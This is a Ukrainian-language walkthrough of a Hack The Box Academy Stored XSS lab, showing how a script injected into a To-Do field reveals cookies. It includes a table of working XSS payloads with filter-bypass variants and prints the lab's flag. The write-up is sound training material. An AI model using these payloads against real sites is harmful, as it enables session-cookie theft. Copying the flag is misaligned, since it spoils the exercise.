# XSS — Stored XSS: показати `document.cookie`

**Модуль:** [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/app/module/103)  
**Секція:** [Stored XSS](https://academy.hackthebox.com/app/module/103/section/967)  
**Завдання:** Змінити JS-payload щоб показав cookie замість URL  
**Прапор:** `HTB{570r3d_f0r_3v3ry0n3_70_533}`

***

## Концепція

**Stored XSS (Persistent XSS)** — зловмисний JS-код зберігається на сервері (у БД, файлі тощо) і виконується у браузері кожного користувача, що відкриває сторінку. На відміну від Reflected XSS, не потребує спеціально сформованого посилання — payload живе у самому застосунку.

Вектор атаки в цьому завданні: поле вводу **To-Do List** не санітизує input → браузер рендерить збережений `<script>` як код.

***

## Вихідний payload (з теорії модуля)

```html
<script>alert(window.origin)</script>
```

Показує URL поточної сторінки — підтверджує наявність XSS, але не витягує чутливих даних.

***

## Payload для отримання прапора

```html
<script>alert(document.cookie)</script>
```

**Зміна:** `window.origin` → `document.cookie`  
`document.cookie` повертає рядок з усіма куками для поточного домену, включно з `flag=HTB{...}`.

***

## Кроки

1. Відкриваємо ціль: `http://TARGET_IP:TARGET_PORT/`
2. У поле **To-Do List** вводимо payload:
   ```html
   <script>alert(document.cookie)</script>
   ```
3. Натискаємо **Add** / Enter — запис зберігається на сервері.
4. Сторінка рендериться → браузер виконує `<script>` → з'являється alert з вмістом куків.
5. Копіюємо значення `flag=HTB{...}` з alert-у у поле відповіді на HTB.

***

## Альтернатива — Firefox DevTools (без alert)

Якщо `alert()` заблоковано браузером або CSP — читаємо куки напряму:

**Варіант A — Console:**

```javascript
// F12 → Console
document.cookie
```

Повертає рядок з усіма куками у форматі `name=value; name2=value2`.

**Варіант B — Storage Inspector:**

```
F12 → Storage → Cookies → [ім'я хоста]
```

Таблиця з усіма куками: Name / Value / Domain / Expires. Знаходимо `flag` → копіюємо Value.

> Обидва варіанти дають той самий результат — різниця лише у методі читання.

***

## Чому це працює (механіка)

```
[Зловмисник вводить payload] → [Сервер зберігає без санітизації] → [Жертва відкриває сторінку]
         ↓
[Браузер рендерить збережений HTML] → [Зустрічає <script>] → [Виконує document.cookie]
         ↓
[Куки відображаються / передаються зловмиснику]
```

У реальних атаках `alert()` замінюється на `fetch()` або `XMLHttpRequest` для відправки куків на зовнішній сервер (out-of-band exfiltration).

***

## XSS Quick Reference

| Payload | Призначення |
|---|---|
| `<script>alert(window.origin)</script>` | Підтвердити наявність XSS (показує URL) |
| `<script>alert(document.cookie)</script>` | Витягнути куки сесії |
| `<script>alert(document.domain)</script>` | Перевірити домен виконання |
| `<img src=x onerror=alert(document.cookie)>` | Bypass якщо `<script>` фільтрується |
| `<svg onload=alert(document.cookie)>` | Альтернативний вектор через SVG |

***

## Прапор

```
HTB{570r3d_f0r_3v3ry0n3_70_533}
```
